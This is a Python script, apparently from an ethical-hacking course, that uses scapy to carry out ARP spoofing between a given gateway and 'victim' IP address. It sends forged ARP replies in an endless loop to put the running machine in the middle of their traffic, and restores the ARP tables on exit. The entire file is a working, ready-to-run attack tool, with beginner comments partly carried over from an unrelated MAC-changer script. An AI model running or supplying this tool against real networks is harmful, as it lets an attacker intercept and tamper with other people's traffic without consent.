#!/usr/bin/env python

import scapy.all as scapy

import time

import sys

import optparse
# optparse is the name of the module that allows us to get arguments from the user and parse them and use them within
# our code.


def get_arguments():
    parser = optparse.OptionParser()
    # "optparse" is created as an instance of the option parser class which is an object that can handle parsing
    # we're giving "parser" the arguments that it can expect from users
    parser.add_option("-g", dest="gateway", help="gateway IP ")
    # dst is the name where the value of the ip is going to be stored.
    parser.add_option("-v", dest="victim", help="victim's IP ")

    # we're going to tell this child to parse the arguments that it gets from the user.
    # "options"  this is what contains the values that the user
    # inputs to access the value for the interface name and the mac address
    # "arguments" variable is going to contain the arguments.
    (options, arguments) = parser.parse_args()

    # way to check and make sure that the user entered a value for the interface and also entered
    # a value for the Mac
    if not options.gateway:
        parser.error("[-] please specify the access point IP , use --help for more info")
    elif not options.victim:
        parser.error("[-] please specify the victim IP  , use --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # an instance of an ARP packet object made by scapy
    # arp_request.show()
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Ethernet object for us from scapy using a class that's implemented by scapy
    # ff:ff:... broadcast mac address
    # broadcast.show()
    arp_request_broadcast = broadcast/arp_request
    # new packet which is th combination of two packets ; scapy allow us to do that
    # arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    # srp send the packet that we give it and receive the response
    # verbose to less output
    # [0] is to chose the first element only which is the answered list

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # ARP packet
    # op=2 means by default when you create an ARP packet you're going to be creating an ARP response
    # pdst is the ip of the target computer
    # hwdst is the mac of the target computer
    # psrc is the source the packet is coming from (false information )
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# a function to restore ARP table to its right value
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # hwsrc been set because the mac has changed to kali machine mac address
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


options = get_arguments()
gateway_ip = str(options.gateway)
target_ip = str(options.victim)

try:
    sent_packets_count = 0
    while True:
        spoof(gateway_ip, target_ip)
        spoof(target_ip, gateway_ip)
        sent_packets_count = sent_packets_count + 2
        # ( , ) is for dynamic printing over the same line
        print("\r packets sent : " + str(sent_packets_count)),
        # to clear the screen
        sys.stdout.flush()
        # time consumed to wait before loop again
        time.sleep(1)
except KeyboardInterrupt:
    # Ctrl + C
    print("\n Exiting .. \n number of packets sent :" + str(sent_packets_count) + "\n resetting ARP tables ... ")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

